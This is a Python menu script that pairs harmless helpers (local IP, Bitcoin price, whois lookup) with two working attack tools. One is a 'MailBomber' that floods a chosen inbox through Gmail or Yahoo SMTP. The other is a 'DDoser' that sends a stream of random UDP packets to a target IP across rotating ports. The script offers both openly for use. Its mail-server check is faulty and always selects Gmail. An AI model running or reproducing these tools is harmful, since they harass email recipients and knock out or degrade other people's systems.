import cryptocompare
import socket
import whois
import os
import sys
import smtplib
import getpass
import time
import random

while True:
    print(" ** Which one Do you want?")
    print("\n ** 1.My IP      **")
    print(" ** 2.BTC Price  **")
    print(" ** 3.Whois      **")
    print(" ** 4.MailBomber **")
    print(" ** 5.DDoser     **")
    print(" ** 0.Exit       **")
    men = int(input(" ))=>> "))
    if men == 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(" ** Your ip :",s.getsockname()[0])
        s.close()
    elif men == 2:
        btc = cryptocompare.get_price('BTC',currency='USD')["BTC"]["USD"]
        print(" ** Price =",btc,"$")
    elif men == 3:
        print(" ** Enter the website :")
        site = input(" ))=>> ")
        w = whois.whois(site)
        print(w)
    elif men == 4:
        server = input (' ** MailServer 1.Gmail/2.Yahoo: ')
        user = input(' ** Email: ')
        passwd = getpass.getpass(' ** Password: ')
        to = input('\n ** To: ')
        body = input(' ** Message: ')
        total = int(input(' ** Number of send: '))
        if server == 'gmail' or '1' or 'Gmail':
            smtp_server = 'smtp.gmail.com'
            port = 587
        elif server == 'yahoo' or '2' or 'Yahoo':
            smtp_server = 'smtp.mail.yahoo.com'
            port = 25
        else:
            print(' ** Kindly Enter Your Answer in 1 or 2 in Mail Server.')
            sys.exit()
        print ('')
        try:
            server = smtplib.SMTP(smtp_server,port)
            server.ehlo()
            if smtp_server == "smtp.gmail.com":
                server.starttls()
            server.login(user,passwd)
            for i in range(1, total+1):
                subject = os.urandom(9)
                msg = "From: "+str(user)+"\nSubject: "+str(subject)+"\n"+str(body)
                server.sendmail(user,to,msg)
                print ("\r ** [+]E-mails sent: %i" % i)
                sys.stdout.flush()
            server.quit()
            print ('\n ** Done  !!!')
            print ('                                                  BomMail :~ Enjoy :)')
        except KeyboardInterrupt:
            print (' ** [-] Canceled')
        except smtplib.SMTPAuthenticationError:
            print ('\n ** [!] Allow access to less secure apps on your gmail account. https://www.google.com/settings/security/lesssecureapps')
    elif men == 5:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        ip = input("  **  IP Target  : ")
        port = int(input("  **  Port       : "))
        number = int(input("  **  Number     : "))
        for sent in range(number):
             sock.sendto(bytes, (ip,port))
             port = port + 1
             if sent % 100 == 0:
                  print( "  **  Sent %s packet to %s :)"%(sent,ip))
             if port == 65534:
                  port = 1
    elif men == 0:
        break;
    ose = input("\n\n\t** Enter a key to exit .")
    os.system("cls")

